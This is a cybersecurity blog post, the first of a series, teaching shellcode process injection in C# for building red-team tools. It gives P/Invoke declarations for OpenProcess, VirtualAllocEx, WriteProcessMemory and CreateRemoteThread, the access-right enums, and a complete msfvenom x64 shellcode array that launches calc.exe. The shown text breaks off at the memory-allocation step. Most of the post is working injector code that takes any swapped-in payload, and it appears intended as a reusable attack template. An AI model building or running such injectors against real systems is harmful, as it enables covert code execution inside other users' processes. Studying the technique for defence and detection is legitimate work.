<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Shellcode Injection in C# - Part 1 - Process Injection" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="Discussing shellcode injection techniques we can use while utilizing C#" /><meta property="og:description" content="Discussing shellcode injection techniques we can use while utilizing C#" /><link rel="canonical" href="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-02T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Shellcode Injection in C# - Part 1 - Process Injection" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2022-09-10T12:20:27+05:00","datePublished":"2022-09-02T00:00:00+05:00","description":"Discussing shellcode injection techniques we can use while utilizing C#","headline":"Shellcode Injection in C# - Part 1 - Process Injection","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/"},"url":"https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/"}</script><title>Shellcode Injection in C# - Part 1 - Process Injection | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Shellcode Injection in C# - Part 1 - Process Injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Shellcode Injection in C# - Part 1 - Process Injection</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1662058800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 2, 2022 </em> </span> <span> Updated <em class="" data-ts="1662794427" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 10, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1123 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In the previous post we discussed how we can use WinAPI in C# and call funtions that we can use to build our red team tools. See the post <a href="https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/">here</a> In this post we will look into how we can use C# to see other ways of shellcode injections.</p><h2 id="process-injection"><span class="mr-2">Process Injection</span><a href="#process-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>From the previous shellcode runner, we saw how we can use the API calls in this order. <br /> <img data-src="/assets/img/shellcode-injections/previous-calls.png" alt="Previous API Calls" data-proofer-ignore> <br /> In case of process injection we use these calls. <br /> <img data-src="/assets/img/shellcode-injections/api-calls.png" alt="Process Injection API Calls" data-proofer-ignore> <br /> We are going to open a process, allocate some memory into it, then write to that memory with our shellcode and then excute it with <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>. <br /> So instead of <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> we are going to use <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> because it has the ability to allocate memory in other process’s address space. Similarly we are using <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> instead of <code class="language-plaintext highlighter-rouge">Marshal.Copy</code> because now we are writing to a remote process and <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> to create a thread in that process. <br /> We can first start to add our imports in. Using the same data conversion table,</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">OpenProcess</span><span class="p">(</span><span class="n">UInt32</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwProcessId</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flProtect</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nSize</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">param</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">lpThreadId</span><span class="p">);</span>
</pre></table></code></div></div><p>After the imports we can put our enums in place. We need to put the <code class="language-plaintext highlighter-rouge">flAllocationType</code> as <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> and <code class="language-plaintext highlighter-rouge">MEM_RESERVE</code>. The <code class="language-plaintext highlighter-rouge">flProtect</code> will remain the same as RWX or <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> and we will have a <code class="language-plaintext highlighter-rouge">dwDesiredAccess</code> for <code class="language-plaintext highlighter-rouge">OpenProcess</code> call which would specify what are the access levels we want to open the process with. The values for it can be found on the Microsoft Docs <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">here</a>. <br /> These enums become</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">enum</span> <span class="n">State</span>
<span class="p">{</span>
  <span class="n">MEM_COMMIT</span> <span class="p">=</span> <span class="m">0x00001000</span><span class="p">,</span>
  <span class="n">MEM_RESERVE</span> <span class="p">=</span> <span class="m">0x00002000</span>
<span class="p">}</span>

<span class="k">public</span> <span class="k">enum</span> <span class="n">Protection</span>
<span class="p">{</span>
  <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">=</span> <span class="m">0x40</span>
<span class="p">}</span>
<span class="k">public</span> <span class="k">enum</span> <span class="n">Process</span>
<span class="p">{</span>
  <span class="n">PROCESS_ALL_ACCESS</span> <span class="p">=</span> <span class="m">0x000F0000</span> <span class="p">|</span> <span class="m">0x00100000</span> <span class="p">|</span> <span class="m">0xFFFF</span><span class="p">,</span>
  <span class="n">PROCESS_CREATE_THREAD</span> <span class="p">=</span> <span class="m">0x0002</span><span class="p">,</span>
  <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="p">=</span> <span class="m">0x0400</span><span class="p">,</span>
  <span class="n">PROCESS_VM_OPERATION</span> <span class="p">=</span> <span class="m">0x0008</span><span class="p">,</span>
  <span class="n">PROCESS_VM_READ</span> <span class="p">=</span> <span class="m">0x0010</span><span class="p">,</span>
  <span class="n">PROCESS_VM_WRITE</span> <span class="p">=</span> <span class="m">0x0020</span>
<span class="p">}</span>
</pre></table></code></div></div><p>With these out of the way we can start with our Main method. First we are going to create our <code class="language-plaintext highlighter-rouge">dwDesiredAccess</code>. We can use <code class="language-plaintext highlighter-rouge">PROCESS_ALL_ACCESS</code> or we can use the other ones like</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">var</span> <span class="n">desiredAccess</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_CREATE_THREAD</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_QUERY_INFORMATION</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_VM_OPERATION</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_VM_READ</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_VM_WRITE</span><span class="p">;</span>
</pre></table></code></div></div><p>Next we can add in our shellcode. I’m using a <code class="language-plaintext highlighter-rouge">calc.exe</code> x64 shellcode I generated from <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c1">// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp</span>
<span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">276</span><span class="p">]</span> <span class="p">{</span>
<span class="m">0xfc</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span>
<span class="m">0x51</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xd2</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x60</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
<span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xb7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span>
<span class="m">0x48</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x02</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span>
<span class="m">0x01</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xe2</span><span class="p">,</span><span class="m">0xed</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x42</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
<span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0x88</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span>
<span class="m">0xd0</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
<span class="m">0xff</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x88</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span>
<span class="m">0xac</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span>
<span class="m">0x24</span><span class="p">,</span><span class="m">0x08</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0xd1</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xd8</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span>
<span class="m">0x66</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span>
<span class="m">0x88</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x5e</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span>
<span class="m">0x41</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xec</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
<span class="m">0x8b</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0xe9</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span>
<span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span>
<span class="m">0x87</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xb5</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0xa6</span><span class="p">,</span><span class="m">0x95</span><span class="p">,</span><span class="m">0xbd</span><span class="p">,</span><span class="m">0x9d</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span>
<span class="m">0xd5</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xc4</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x0a</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x05</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span>
<span class="m">0x47</span><span class="p">,</span><span class="m">0x13</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xda</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span>
<span class="m">0x63</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x00</span> <span class="p">};</span>
</pre></table></code></div></div><p>We need to initialize some values like the shellcode size.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">shellcode_size</span> <span class="p">=</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">bytesWritten</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">lpthreadID</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</pre></table></code></div></div><p>When all these values are set we can start with calling APIs. First one we will be using is <code class="language-plaintext highlighter-rouge">OpenProcess</code> to open the process. It takes three arguments. The desired access, inherit handle and the process ID. We already have the desired access variable set that we can use. We dont need a inherit handle because we dont want this process to be inherited by a child process and the process ID is something we can give on the command line.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">procHandle</span> <span class="p">=</span> <span class="nf">OpenProcess</span><span class="p">((</span><span class="kt">uint</span><span class="p">)</span><span class="n">desiredAccess</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>
</pre></table></code></div></div><p>Now we can allocate some memory into the process. Like we did in the shellcode runner,</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">init</span> <span class="p">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">State</span><span class="p">.</span><span class="n">MEM_COMMIT</span> <span class="p">|</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">State</span><span class="p">.</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">Protection</span><span class="p">.</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
